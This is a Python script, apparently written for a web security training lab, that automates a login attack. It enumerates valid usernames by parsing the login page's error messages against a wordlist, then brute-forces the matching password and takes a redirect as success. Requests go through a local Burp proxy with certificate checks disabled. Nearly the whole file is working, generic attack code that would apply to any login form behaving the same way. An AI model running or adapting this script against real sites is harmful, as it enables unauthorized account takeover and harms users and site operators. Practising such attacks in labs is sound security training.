import sys

import requests
import urllib3
from bs4 import BeautifulSoup

# Step 2: take in the requested url as an input parameter
# Step 3: set up data needed for sending POST or get request (starting off with POST)
# Step 4: User enumeration
# Step 5: Password Brute force using the username found within step 4

# As labs use https, in order to send requests to Burp and other Proxies without lots of warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


#  Read in wordlists for username and password
def read_wordfile(wordfile):
    # open passed wordfile file
    file = open(wordfile)

    # read file
    wordfile_list = file.readlines()

    # close file
    file.close()

    return wordfile_list


# prepare the payloads to be used for POST requests
def prepare_payload(username, password, setting_password):
    # setting_password should be true if we are setting the password
    # Prepare the payload
    if setting_password:
        return {"username": f"{username}", "password": f"{password}"}
    else:
        return {"username": f"{username}", "password": "random"}


# perform_request will actually send the request using the payloads
def perform_request(url, username, password, user_or_pass):
    proxies = {"http": "http://localhost:8080", "https": "http://localhost:8080"}
    # ok:disabled-cert-validation
    response = requests.post(
        url,
        data=prepare_payload(username, password, user_or_pass),
        allow_redirects=False,
        proxies=proxies,
        verify=False,
    )
    # when enumerating the correct password, we have to pass response directly upon redirect
    if response.status_code != 200 and not user_or_pass:
        print(f"{response.status_code}: did not work")
        return None
    elif response.status_code != 200 and user_or_pass:
        return response
    return response


# enumerate the returned login error by parsing the HTML
def grab_response_error(response):
    soup = BeautifulSoup(response.content, "html.parser")
    tag = soup.find("p", class_="is-warning")
    if tag.string == "Invalid username or password.":
        return None
    return tag


# logic for enumerating the correct username
def enumerate_usernames(url, usernames):
    hits = ""
    for username in usernames:
        cleaned_text = username.replace("\n", "")
        response = perform_request(url, cleaned_text, "", False)
        if response:
            potential_hit = grab_response_error(response)
            if potential_hit:
                hits = cleaned_text
                break
            else:
                continue
    return hits


# logic for enumerating the passwords
def brute_password(url, username, passwords):
    for password in passwords:
        cleaned_text = password.replace("\n", "")
        response = perform_request(url, username, cleaned_text, True)
        if response.status_code == 302:
            return cleaned_text


def main():
    # ensure proper command line variables were passed
    if len(sys.argv) != 4:
        print("(+) Usage: %s <url> <usernames.txt> <passwords.txt>" % sys.argv[0])
        print(
            "(+) Example: %s www.example.com file/path/usernames file/path/passwords"
            % sys.argv[0]
        )
        sys.exit(-1)

    # read in the wordlists
    usernames = read_wordfile(sys.argv[2])
    passwords = read_wordfile(sys.argv[3])

    # Enumerate username and password
    correct_username = enumerate_usernames(sys.argv[1], usernames)
    if correct_username == "":
        print("Unable to find correct username. Exiting...")
        return
    print("Correct username: ", correct_username)
    correct_password = brute_password(sys.argv[1], correct_username, passwords)
    print(f"{correct_username} and {correct_password}")


if __name__ == "__main__":
    main()
